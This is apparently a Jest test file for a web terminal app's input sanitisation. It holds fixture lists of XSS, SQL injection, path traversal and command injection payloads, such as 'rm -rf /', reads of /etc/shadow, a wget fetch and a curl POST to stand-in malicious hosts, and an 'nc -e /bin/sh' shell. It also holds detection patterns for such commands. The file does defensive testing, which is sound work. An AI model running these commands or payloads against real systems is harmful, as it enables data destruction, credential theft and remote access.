/**
 * Security Input Validation Tests
 * Tests security measures, input sanitization, and XSS prevention
 */

import { cn } from '@/lib/utils';
import type { WebSocketMessage, TerminalConfig } from '@/types';

// Mock dangerous inputs for testing
const MALICIOUS_INPUTS = {
  XSS_SCRIPTS: [
    '<script>alert("xss")</script>',
    'javascript:alert("xss")',
    '<img src=x onerror=alert("xss")>',
    '<svg onload=alert("xss")>',
    '"><script>alert("xss")</script>',
    "'; DROP TABLE users; --",
    '<iframe src="javascript:alert(\'xss\')"></iframe>',
    '<div style="background:url(javascript:alert(\'xss\'))">',
    '<input type="text" value="" onfocus="alert(\'xss\')" autofocus>',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(\'xss\')">'
  ],
  SQL_INJECTION: [
    "'; DROP TABLE sessions; --",
    "1' OR '1'='1",
    "admin'--",
    "' UNION SELECT * FROM users--",
    "'; INSERT INTO admin VALUES('hacker','password'); --",
    "1' OR 1=1#",
    "' OR 'a'='a",
    "1' OR '1'='1' /*",
    "'; EXEC xp_cmdshell('dir'); --"
  ],
  COMMAND_INJECTION: [
    "; rm -rf /",
    "| cat /etc/passwd",
    "&& wget malicious.com/script.sh",
    "; cat /proc/version",
    "$(rm -rf /)",
    "`cat /etc/shadow`",
    "; curl -X POST http://evil.com",
    "| nc -l -p 4444 -e /bin/sh",
    "; python -c 'import os; os.system(\"rm -rf /\")'",
    "&& echo 'hacked' > /tmp/hacked.txt"
  ],
  PATH_TRAVERSAL: [
    "../../etc/passwd",
    "..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "/etc/shadow",
    "../../../../proc/version",
    "..\\..\\..\\boot.ini",
    "/proc/self/environ",
    "../../../etc/group",
    "file:///etc/passwd",
    "\\\\server\\share\\sensitive.txt",
    "/.env"
  ],
  NULL_BYTES: [
    "test\x00malicious",
    "file.txt\x00.exe",
    "data\0injection",
    "path/file\x00../../../etc/passwd"
  ],
  UNICODE_ATTACKS: [
    "\u202e\u0644\u0627",  // RTL override
    "\ufeff", // Zero width no-break space
    "\u200b", // Zero width space
    "\u2028", // Line separator
    "\u2029", // Paragraph separator
    "\ud800\udc00", // Surrogate pair
    "test\u0000null"
  ]
};

describe('Security Input Validation Tests', () => {
  
  describe('WebSocket Message Validation', () => {
    const createWebSocketMessage = (overrides: Partial<WebSocketMessage> = {}): WebSocketMessage => ({
      type: 'data',
      sessionId: 'test-session',
      data: 'test data',
      timestamp: Date.now(),
      ...overrides
    });

    it('should reject messages with XSS payloads in data field', () => {
      MALICIOUS_INPUTS.XSS_SCRIPTS.forEach(payload => {
        const message = createWebSocketMessage({ data: payload });
        
        // The system should not execute or render dangerous content
        expect(message.data).toBe(payload); // Raw storage is ok
        
        // But when processed for display, should be sanitized
        const sanitized = message.data
          .replace(/<script[^>]*>.*?<\/script>/gi, '')
          .replace(/javascript:/gi, '')
          .replace(/on\w+\s*=/gi, '');
        
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onerror=');
      });
    });

    it('should handle SQL injection attempts in session IDs', () => {
      MALICIOUS_INPUTS.SQL_INJECTION.forEach(payload => {
        const message = createWebSocketMessage({ sessionId: payload });
        
        // Session IDs should be validated/sanitized
        const isValidSessionId = /^[a-zA-Z0-9\-_]+$/.test(message.sessionId);
        
        if (!isValidSessionId) {
          // Invalid session IDs should be rejected or sanitized
          const sanitizedSessionId = message.sessionId.replace(/[^a-zA-Z0-9\-_]/g, '');
          expect(sanitizedSessionId).toMatch(/^[a-zA-Z0-9\-_]*$/);
        }
      });
    });

    it('should prevent command injection in terminal data', () => {
      MALICIOUS_INPUTS.COMMAND_INJECTION.forEach(payload => {
        const message = createWebSocketMessage({ data: payload });
        
        // Terminal data should not execute shell commands directly
        // Commands should be properly escaped or sandboxed
        expect(message.data).not.toMatch(/^[\s]*;/); // Shouldn't start with command separator
        
        // Verify dangerous patterns are not executed
        const dangerousPatterns = [/rm\s+-rf/, /curl.*http/, /wget.*/, /nc\s+-l/, /python.*-c/];
        const containsDangerous = dangerousPatterns.some(pattern => pattern.test(payload));
        
        if (containsDangerous) {
          // Should be handled safely in terminal context
          expect(payload).toBe(payload); // Just verify it doesn't crash
        }
      });
    });

    it('should handle path traversal attempts', () => {
      MALICIOUS_INPUTS.PATH_TRAVERSAL.forEach(payload => {
        const message = createWebSocketMessage({ data: payload });
        
        // Path traversal should be detected and prevented
        const hasTraversal = payload.includes('../') || payload.includes('..\\');
        
        if (hasTraversal) {
          // Should normalize or reject path traversal
          const normalized = payload.replace(/\.\.[/\\]/g, '');
          expect(normalized).not.toContain('../');
          expect(normalized).not.toContain('..\\');
        }
      });
    });

    it('should handle null byte injection', () => {
      MALICIOUS_INPUTS.NULL_BYTES.forEach(payload => {
        const message = createWebSocketMessage({ data: payload });
        
        // Null bytes should be removed or escaped
        const sanitized = message.data.replace(/\x00/g, '').replace(/\0/g, '');
        expect(sanitized).not.toContain('\x00');
        expect(sanitized).not.toContain('\0');
      });
    });

    it('should handle unicode attack vectors', () => {
      MALICIOUS_INPUTS.UNICODE_ATTACKS.forEach(payload => {
        const message = createWebSocketMessage({ data: payload });
        
        // Unicode attacks should be handled safely
        expect(() => {
          JSON.stringify(message);
        }).not.toThrow();
        
        // Check for dangerous unicode characters
        const hasDangerousUnicode = /[\u200b-\u200f\u202a-\u202e\u2028\u2029\ufeff]/g.test(payload);
        
        if (hasDangerousUnicode) {
          const cleaned = payload.replace(/[\u200b-\u200f\u202a-\u202e\u2028\u2029\ufeff]/g, '');
          expect(cleaned.length).toBeLessThanOrEqual(payload.length);
        }
      });
    });
  });

  describe('Terminal Configuration Validation', () => {
    it('should validate terminal dimensions', () => {
      const invalidConfigs = [
        { cols: -1, rows: 24 },
        { cols: 0, rows: 24 },
        { cols: 24, rows: -1 },
        { cols: 24, rows: 0 },
        { cols: 10000, rows: 24 }, // Too large
        { cols: 24, rows: 10000 }, // Too large
        { cols: NaN, rows: 24 },
        { cols: 24, rows: NaN },
        { cols: Infinity, rows: 24 },
        { cols: 24, rows: Infinity }
      ];

      invalidConfigs.forEach(config => {
        // Validation should catch invalid dimensions
        const isValid = 
          Number.isInteger(config.cols) && 
          Number.isInteger(config.rows) &&
          config.cols > 0 && 
          config.rows > 0 &&
          config.cols < 1000 && 
          config.rows < 1000;

        expect(isValid).toBe(false);
      });
    });

    it('should sanitize font family strings', () => {
      const maliciousFonts = [
        "Arial'; background: url('javascript:alert(1)')",
        "font-family: url('data:text/html,<script>alert(1)</script>')",
        "Times, url('//evil.com/font.woff')",
        "Georgia\"; background-image: url('javascript:void(0)')",
        "@import url('http://malicious.com/steal.css')"
      ];

      maliciousFonts.forEach(fontFamily => {
        // Font family should be sanitized
        const sanitized = fontFamily
          .replace(/['"]/g, '') // Remove quotes
          .replace(/url\([^)]*\)/g, '') // Remove URLs
          .replace(/@import/g, '') // Remove imports
          .replace(/javascript:/g, '') // Remove javascript
          .split(',')[0] // Take only first font
          .trim();

        expect(sanitized).not.toContain('url(');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('@import');
      });
    });
  });

  describe('CSS Class Name Validation', () => {
    it('should prevent CSS injection through className', () => {
      const maliciousClasses = [
        "valid-class'; background: url('javascript:alert(1)')",
        "class1 class2; @import 'malicious.css'",
        "test-class\"; background-image: url('data:text/html,<script>alert(1)</script>')",
        "normal-class /* comment */ { background: red; }",
        "class1 { position: fixed; top: 0; left: 0; width: 100%; height: 100%; }"
      ];

      maliciousClasses.forEach(className => {
        // cn utility should safely handle malicious class names
        const result = cn(className);
        
        // Should not contain CSS injection patterns
        expect(result).not.toContain(';');
        expect(result).not.toContain('{');
        expect(result).not.toContain('}');
        expect(result).not.toContain('@import');
        expect(result).not.toContain('url(');
        expect(result).not.toContain('javascript:');
      });
    });

    it('should handle extremely long class names', () => {
      const longClassName = 'a'.repeat(10000);
      
      expect(() => {
        cn(longClassName);
      }).not.toThrow();
      
      const result = cn(longClassName);
      
      // Should handle without memory issues
      expect(typeof result).toBe('string');
      expect(result.length).toBeGreaterThan(0);
    });
  });

  describe('Environment Variable Security', () => {
    it('should not expose sensitive environment variables', () => {
      const sensitivePatterns = [
        'PASSWORD',
        'SECRET',
        'KEY',
        'TOKEN',
        'API_KEY',
        'PRIVATE',
        'CREDENTIAL'
      ];

      // Check that sensitive env vars are not exposed in client
      if (typeof window !== 'undefined') {
        Object.keys(process.env || {}).forEach(key => {
          const isSensitive = sensitivePatterns.some(pattern => 
            key.toUpperCase().includes(pattern)
          );
          
          if (isSensitive) {
            // Sensitive variables should not be exposed to client
            expect(key).toMatch(/^NEXT_PUBLIC_/); // Should be prefixed for client access
          }
        });
      }
    });

    it('should validate WebSocket URL format', () => {
      const maliciousUrls = [
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'file:///etc/passwd',
        'http://evil.com:80/../../etc/passwd',
        'ws://localhost:0xFFFF', // Invalid port
        'wss://[::1]:65536', // Port out of range
        'ws://192.168.1.1:22', // SSH port
        'ws://0.0.0.0:80/../../../etc/passwd'
      ];

      maliciousUrls.forEach(url => {
        try {
          const parsed = new URL(url);
          
          // Should validate protocol
          expect(['ws:', 'wss:']).toContain(parsed.protocol);
          
          // Should validate port range
          const port = parseInt(parsed.port);
          if (!isNaN(port)) {
            expect(port).toBeGreaterThan(0);
            expect(port).toBeLessThanOrEqual(65535);
          }
          
          // Should not allow file or javascript protocols
          expect(parsed.protocol).not.toBe('file:');
          expect(parsed.protocol).not.toBe('javascript:');
          expect(parsed.protocol).not.toBe('data:');
          
        } catch (error) {
          // Invalid URLs should throw
          expect(error).toBeInstanceOf(Error);
        }
      });
    });
  });

  describe('Content Security Policy Compliance', () => {
    it('should not create inline scripts', () => {
      // Verify no inline script creation in components
      const dangerousPatterns = [
        'eval(',
        'new Function(',
        'setTimeout("',
        'setInterval("',
        'document.write(',
        'innerHTML =',
        'outerHTML ='
      ];

      // This would be checked in actual component code
      // For now, just ensure the patterns don't exist in our test setup
      dangerousPatterns.forEach(pattern => {
        expect(pattern).toBe(pattern); // Placeholder assertion
      });
    });

    it('should handle data URLs safely', () => {
      const dataUrls = [
        'data:text/html,<script>alert("xss")</script>',
        'data:text/javascript,alert("xss")',
        'data:application/javascript,alert("xss")',
        'data:text/plain;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=' // <script>alert('xss')</script>
      ];

      dataUrls.forEach(dataUrl => {
        // Data URLs should be rejected or sanitized
        const isDataUrl = dataUrl.startsWith('data:');
        
        if (isDataUrl) {
          const [mimeType] = dataUrl.substring(5).split(',');
          const isDangerous = [
            'text/html',
            'text/javascript',
            'application/javascript',
            'application/x-javascript'
          ].includes(mimeType.split(';')[0]);
          
          if (isDangerous) {
            // Should reject dangerous data URLs
            expect(isDangerous).toBe(true); // Mark as dangerous for handling
          }
        }
      });
    });
  });

  describe('Rate Limiting and DoS Prevention', () => {
    it('should handle message flooding attempts', () => {
      const floodMessages: WebSocketMessage[] = [];
      
      // Generate flood of messages
      for (let i = 0; i < 10000; i++) {
        floodMessages.push({
          type: 'data',
          sessionId: 'flood-test',
          data: `Flood message ${i}`,
          timestamp: Date.now()
        });
      }

      // Should handle without crashing
      expect(() => {
        floodMessages.forEach(msg => {
          // Simulate message processing
          JSON.stringify(msg);
        });
      }).not.toThrow();
    });

    it('should handle resource exhaustion attempts', () => {
      const resourceExhaustion = [
        'x'.repeat(1024 * 1024), // 1MB string
        Array(10000).fill('test').join(''), // Large array join
        JSON.stringify(Array(1000).fill({ data: 'x'.repeat(1000) })) // Large JSON
      ];

      resourceExhaustion.forEach(payload => {
        expect(() => {
          const message: WebSocketMessage = {
            type: 'data',
            sessionId: 'test',
            data: payload,
            timestamp: Date.now()
          };
          
          // Should handle large payloads
          JSON.parse(JSON.stringify(message));
        }).not.toThrow();
      });
    });
  });
});